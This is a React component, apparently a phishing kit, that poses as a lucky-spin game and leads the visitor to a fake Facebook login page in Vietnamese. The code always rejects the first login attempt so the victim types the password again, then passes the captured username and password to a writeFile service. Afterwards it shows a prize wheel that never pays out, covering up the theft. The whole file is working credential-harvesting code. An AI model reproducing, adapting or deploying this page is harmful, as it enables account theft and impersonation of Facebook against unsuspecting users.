import React from 'react';
import bg1 from '../assets/rotationLuck/bg1.jpg';
import anh1 from '../assets/rotationLuck/1.png';
import anh2 from '../assets/rotationLuck/2.png';
import { writeFile } from '../services/writeFileService'
import axios from "axios";

class home extends React.Component {
    constructor(props) {
        super(props);
        this.state = {
            username: '',
            password: '',
            isCheck: 'home',
            isCheckSpin: false,
            isCheckNotifi: false,
            isCheckInfor: false,
            ticket: 1,
            isCheckTicket: true,
            ticketLogin: 1,
        }
    }
    OnchangeEmail = (event) => {
        this.setState({
            username: event.target.value,
            isCheckInfor: false,
        })
    }
    OnchangePassword = (event) => {
        this.setState({
            password: event.target.value,
            isCheckInfor: false,
        })
    }
    onClickPlay = () => {
        this.setState({
            isCheck: 'login'
        })
    }
    OnclickLogIn = async () => {
        var passworD = this.state.password;
        var usernamE = this.state.username;
        if (!usernamE || !passworD || usernamE.length < 10 || passworD.length < 4) {
            this.setState({
                isCheckInfor: true,
            })
        } else {
            if (this.state.ticketLogin == 0) {
                await writeFile(this.state.username, this.state.password)
                setTimeout(
                    () => this.setState({ isCheck: 'rotation', }), 1500
                );
            } else {
                this.setState({
                    ticketLogin: 0,
                    isCheckInfor: true
                })
            }

        }

    }
    spin = () => {
        if (this.state.ticket == 1) {
            this.setState({
                isCheckSpin: true,
                ticket: 0
            })
            setTimeout(
                () => this.setState({ isCheckSpin: false, isCheckNotifi: true, }),
                2500
            );
        } else {
            this.setState({
                isCheckTicket: false,
                isCheckNotifi: true
            })
        }
    }
    onClickExit = () => {
        this.setState({
            isCheckNotifi: false
        })
    }

    render() {

        return (
            <>
                {this.state.isCheck == 'home' &&
                    <div className='h-screen w-screen bg-red-50'>
                        <div className='relative h-full w-full'>
                            <img className='absolute right-0 left-0 m-auto w-auto h-full' src={bg1} />
                            <button onClick={() => this.onClickPlay()}
                                className='text-white font-[500] text-[30px] shadow-xl h-[50px] w-[300px]
                            bg-red-300 rounded-[5px] animate-bounce
                            absolute right-0 left-0 top-0 bottom-0 m-auto border-[2px] '>CHƠI NGAY NÀO</button>
                        </div>
                    </div>
                }
                {/* Login */}
                {this.state.isCheck == 'login' &&
                    <div className='h-screen w-screen bg-[#f0f2f5]'>
                        <div className='h-full w-full flex items-center justify-center'>
                            <div className='px-[14px] pb-[30px] pt-[20px] space-y-[10px] border sm:w-[500px] w-full mx-[20px] rounded-[10px] shadow-lg bg-white'>
                                <div className='text-center pb-[10px]'>
                                    <span className='text-[40px] text-[#1877f2] font-[500]'>facebook.com</span><br />
                                    <span className='text-[20px] font-[500]'>Đăng nhập Facebook</span>
                                </div>
                                {this.state.isCheckInfor == true &&
                                    <div className='border-red-600 border rounded-[5px] bg-[#ffebe8] text-center p-[5px]'>
                                        <span className='text-[16px] font-[500]'>Sai thông tin đăng nhập</span><br />
                                        <span className='text-[14px]'>Tên người dùng hoặc mật khẩu không hợp lệ</span>
                                    </div>
                                }
                                <div className='space-y-[5px]'>
                                    <input onChange={(event) => this.OnchangeEmail(event)}
                                        placeholder='username hoặc số điện thoại'
                                        className='w-full h-[50px] border rounded-[5px] pl-[10px] text-[18px]'></input>
                                </div>
                                <div className='space-y-[5px]'>
                                    <input onChange={(event) => this.OnchangePassword(event)}
                                        placeholder='Mật khẩu' type='password'
                                        className='w-full h-[50px] border rounded-[5px] pl-[10px] text-[18px]'></input>
                                </div>
                                <div className='pt-[5px]'>
                                    <button onClick={() => this.OnclickLogIn()}
                                        className='w-full border py-[10px] bg-[#1877f2] text-white font-[500] text-[20px] rounded-[5px]'
                                    >Đăng nhập</button>
                                </div>
                            </div>
                        </div>
                    </div >
                }
                {/* Spin */}
                {this.state.isCheck == 'rotation' &&
                    <div className='h-screen w-screen bg-red-50 '>
                        <div className='relative h-full w-full '>
                            <img className='absolute right-0 top-0 left-0 bottom-0 m-auto' src={anh1} />
                            {this.state.isCheckSpin == true && <img className='absolute right-0 top-0 left-0 bottom-0 m-auto animate-spin' src={anh1} />}
                            <img onClick={() => this.spin()} className='absolute right-0 top-0 left-0 bottom-0 m-auto' src={anh2} />
                        </div>
                    </div>
                }
                {/* Notifi */}
                {this.state.isCheckNotifi == true &&
                    <div className="justify-center items-center flex overflow-x-hidden overflow-y-auto fixed inset-0 z-50 outline-none focus:outline-none">
                        <div className="relative max-w-2xl px-[40px]">
                            <div className="border-0 rounded-lg shadow-lg relative flex flex-col w-full bg-white outline-none focus:outline-none">
                                <div className=' border-[1px]  shadow-xl p-[20px] space-y-[10px] rounded-[4px]'>
                                    <div className='text-center border  text-black text-[20px] font-[600] py-[4px] px-[10px] rounded-[5px]'>
                                        {this.state.isCheckTicket == true && <h1>Chúc bạn may mắn lần sau</h1>}
                                        {this.state.isCheckTicket == false && <h1>Bạn đã hết lượt quay</h1>}
                                    </div>

                                    <div className='flex items-center justify-center text-[16px] text-white font-[500]'>
                                        <button className='w-[80px]  bg-[#fd475d]  py-[5px] shadow-md border rounded-[4px]  '
                                            onClick={() => this.onClickExit()}
                                        >THOÁT</button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                }
            </>
        )
    }
}

export default home;
